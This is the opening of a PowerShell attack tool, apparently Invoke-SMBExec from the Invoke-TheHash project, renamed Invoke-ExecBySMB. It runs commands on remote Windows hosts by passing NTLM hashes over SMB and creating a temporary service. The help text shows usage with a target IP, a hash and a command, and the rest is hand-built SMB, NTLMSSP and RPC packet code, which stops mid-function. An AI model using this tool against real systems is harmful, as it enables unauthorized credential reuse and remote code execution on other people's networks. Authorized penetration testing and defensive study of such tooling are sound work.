
function global:Invoke-ExecBySMB
{
<#
.SYNOPSIS
Invoke-SMBExec performs SMBExec style command execution with NTLMv2 pass the hash authentication. Invoke-SMBExec
supports SMB1 and SMB2.1 with and without SMB signing.

Author: Kevin Robertson (@kevin_robertson)
License: BSD 3-Clause

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username.

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target. If a command is not specified, the function will check to see if the username
and hash provides local administrator access on the target.

.PARAMETER CommandCOMSPEC
Default = Enabled: Prepend %COMSPEC% /C to Command.

.PARAMETER Service
Default = 20 Character Random: Name of the service to create and delete on the target.

.PARAMETER Sleep
Default = 150 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.PARAMETER Session
Inveigh-Relay authenticated session.

.PARAMETER Version
Default = Auto: (Auto,1,2.1) Force SMB version. The default behavior is to perform SMB version negotiation and use SMB2.1 if supported by the
target.

.EXAMPLE
Execute a command.
Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

.EXAMPLE
Check command execution privilege.
Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
Execute a command using an authenticated Inveigh-Relay session.
Invoke-SMBExec -Session 1 -Command "command or launcher to execute"

.EXAMPLE
Check if SMB signing is required.
Invoke-SMBExec -Target 192.168.100.20

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][String]$Target,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)

if($PsCmdlet.ParameterSetName -ne 'Session' -and !$Target)
{
    Write-Output "[-] Target is required when not using -Session"
    throw
}

if($Command)
{
    $SMB_execute = $true
}

if($Version -eq '1')
{
    $SMB_version = 'SMB1'
}
elseif($Version -eq '2.1')
{
    $SMB_version = 'SMB2.1'
}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')
{
    $signing_check = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($OrderedDictionary)

    ForEach($field in $OrderedDictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}
function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($Version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

function New-PacketSMBSessionSetupAndXRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]
    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)
    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)
    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)
    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 
}

function New-PacketSMBTreeConnectAndXRequest
{
    param([Byte[]]$Path)

    [Byte[]]$path_length = $([System.BitConverter]::GetBytes($Path.Length + 7))[0,1]

    $SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeConnectAndXRequest.Add("WordCount",[Byte[]](0x04))
    $SMBTreeConnectAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBTreeConnectAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("PasswordLength",[Byte[]](0x01,0x00))
    $SMBTreeConnectAndXRequest.Add("ByteCount",$path_length)
    $SMBTreeConnectAndXRequest.Add("Password",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("Tree",$Path)
    $SMBTreeConnectAndXRequest.Add("Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return $SMBTreeConnectAndXRequest
}

function New-PacketSMBNTCreateAndXRequest
{
    param([Byte[]]$NamedPipe)

    [Byte[]]$named_pipe_length = $([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]
    [Byte[]]$file_name_length = $([System.BitConverter]::GetBytes($NamedPipe.Length - 1))[0,1]

    $SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNTCreateAndXRequest.Add("WordCount",[Byte[]](0x18))
    $SMBNTCreateAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBNTCreateAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Reserved2",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("FileNameLen",$file_name_length)
    $SMBNTCreateAndXRequest.Add("CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("RootFID",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SMBNTCreateAndXRequest.Add("AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Disposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("SecurityFlags",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("ByteCount",$named_pipe_length)
    $SMBNTCreateAndXRequest.Add("Filename",$NamedPipe)

    return $SMBNTCreateAndXRequest
}

function New-PacketSMBReadAndXRequest
{
    $SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBReadAndXRequest.Add("WordCount",[Byte[]](0x0a))
    $SMBReadAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBReadAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBReadAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("FID",[Byte[]](0x00,0x40))
    $SMBReadAndXRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBReadAndXRequest.Add("MaxCountLow",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("MinCount",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("Unknown",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBReadAndXRequest.Add("Remaining",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBReadAndXRequest
}

function New-PacketSMBWriteAndXRequest
{
    param([Byte[]]$FileID,[Int]$Length)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($Length)[0,1]

    $SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBWriteAndXRequest.Add("WordCount",[Byte[]](0x0e))
    $SMBWriteAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBWriteAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBWriteAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("FID",$FileID)
    $SMBWriteAndXRequest.Add("Offset",[Byte[]](0xea,0x03,0x00,0x00))
    $SMBWriteAndXRequest.Add("Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBWriteAndXRequest.Add("WriteMode",[Byte[]](0x08,0x00))
    $SMBWriteAndXRequest.Add("Remaining",$write_length)
    $SMBWriteAndXRequest.Add("DataLengthHigh",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("DataLengthLow",$write_length)
    $SMBWriteAndXRequest.Add("DataOffset",[Byte[]](0x3f,0x00))
    $SMBWriteAndXRequest.Add("HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBWriteAndXRequest.Add("ByteCount",$write_length)

    return $SMBWriteAndXRequest
}

function New-PacketSMBCloseRequest
{
    param ([Byte[]]$FileID)

    $SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBCloseRequest.Add("WordCount",[Byte[]](0x03))
    $SMBCloseRequest.Add("FID",$FileID)
    $SMBCloseRequest.Add("LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBCloseRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBCloseRequest
}

function New-PacketSMBTreeDisconnectRequest
{
    $SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeDisconnectRequest.Add("WordCount",[Byte[]](0x00))
    $SMBTreeDisconnectRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBTreeDisconnectRequest
}

function New-PacketSMBLogoffAndXRequest
{
    $SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBLogoffAndXRequest.Add("WordCount",[Byte[]](0x02))
    $SMBLogoffAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBLogoffAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBLogoffAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBLogoffAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBLogoffAndXRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequestFile
{
    param([Byte[]]$NamedPipe)

    $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]

    $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequestFile.Add("NameLength",$name_length)
    $SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Buffer",$NamedPipe)

    return $SMB2CreateRequestFile
}

function New-PacketSMB2ReadRequest
{
    param ([Byte[]]$FileID)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$FileID,[Int]$RPCLength)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$write_length)
    $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth
}

#RPC

function New-PacketRPCBind
{
    param([Byte[]]$FragLength,[Int]$CallID,[Byte[]]$NumCtxItems,[Byte[]]$ContextID,[Byte[]]$UUID,[Byte[]]$UUIDVersion)

    [Byte[]]$call_ID = [System.BitConverter]::GetBytes($CallID)

    $RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCBind.Add("Version",[Byte[]](0x05))
    $RPCBind.Add("VersionMinor",[Byte[]](0x00))
    $RPCBind.Add("PacketType",[Byte[]](0x0b))
    $RPCBind.Add("PacketFlags",[Byte[]](0x03))
    $RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCBind.Add("FragLength",$FragLength)
    $RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
    $RPCBind.Add("CallID",$call_ID)
    $RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $RPCBind.Add("NumCtxItems",$NumCtxItems)
